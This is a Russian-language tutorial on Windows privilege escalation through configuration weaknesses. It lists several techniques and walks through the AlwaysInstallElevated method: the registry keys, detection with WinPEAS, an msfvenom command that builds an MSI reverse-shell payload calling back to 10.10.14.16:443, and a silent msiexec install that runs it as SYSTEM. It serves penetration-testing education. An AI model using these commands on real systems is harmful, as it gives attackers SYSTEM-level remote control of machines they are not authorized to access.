### Эксплуатация уязвимостей конфигурации ОС Windows

В этой категории яркими примерами возможных методов повышения привилегий будут следующие:

- Повышение привилегий через права на создание резервных копий (SeBackupPrivilege)
- Повышение привилегий через перехват сервиса (Weak Services Permission)
- Повышение привилегий через имперсонификацию SeImpersonatePrivilege (JyicyPotato)
- Повышение привилегий через права на установку ПО (AlwaysInstallElevated)
- Повышение привилегий через изменение пути бинарного файла сервиса (Service Binary Path)
- Повышение привилегий через подмену DLL библиотек (DLL Hijacking)
- Повышение привилегий через неэкранированные пути сервисов (Unquoted Service Paths)

### Повышение привилегий через права на установку ПО (AlwaysInstallElevated):

пример некорректной конфигурации ОС Windows
Такая конфигурация позволяет нам воспользоваться случаем и повысить привилегии до прав системы. В ряде случаев
администраторы не ограничивают пользователей в самостоятельной установке ПО.

Настройка производится через изменение ключей реестра (HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer и
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer) и указывает системе разрешать пользователю установку файлов *.msi, а
установка, в свою очередь, производится с повышенными привилегиями (NT AUTHORITY\SYSTEM).

#### Обнаружение в WinPeas

Если WinPeas увидит такую возможность, то отобразит нам ее в следующем виде:

Более подробную информацию о данном векторе можно получить по следующим ссылкам:

    AlwaysInstallElevated
    System Binary Proxy Execution: Msiexec

Эксплуатация

Для реализации атаки необходимо сгенерировать файл с полезной нагрузкой в формате msi:

>msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 -f msi -o rev.msi

Эта команда использует утилиту "msfvenom" из фреймворка Metasploit для создания исполняемого файла "rev.msi", который
содержит обратную оболочку для Windows x64 и связывается с IP-адресом 10.10.14.16 на порту 443.

Подробнее о параметрах команды:

    --platform windows — указывает, что будет использоваться платформа Windows
    -a x64 — указывает, что будет использоваться архитектура x64
    -p windows/x64/shell_reverse_tcp — выбирает тип обратной оболочки, которая будет использоваться в исполняемом файле
    LHOST=10.10.14.16 — задает IP-адрес, на который будет устанавливаться обратная связь
    LPORT=443 — задает порт, на который будет устанавливаться обратная связь
    -f msi — указывает формат файла, который будет создан (в данном случае это MSI-файл Windows Installer)
    -o rev.msi — задает имя и путь для выходного файла

Запуск “установщика”

Для запуска установщика из консоли необходимо использовать инструмент MSIEXEC.

MSIEXEC - средство установки, изменения и выполнения операций установщика Windows из командной строки.

>msiexec /quiet /qn /i rev.msi

Команда msiexec /quiet /qn /i rev.msi запускает установку MSI-файла rev.msi с использованием утилиты msiexec в режиме "
тихой" установки.

Подробнее о параметрах команды:

    /quiet — указывает на режим тихой установки, в котором пользователю не будут выводиться диалоговые окна и сообщения
    /qn — указывает на то, что будет использоваться минимальный уровень отображения информации о ходе установки
    /i — указывает, что будет произведена установка MSI-пакета
    rev.msi — имя MSI-файла, который будет устанавливаться

Таким образом, команда позволяет запустить процесс тихой установки MSI-пакета без вывода диалоговых окон и сообщений о
ходе установки. В данном случае, это позволит запустить исполняемый файл, созданный с помощью утилиты "msfvenom", и
установить на компьютер обратную оболочку для удаленного управления.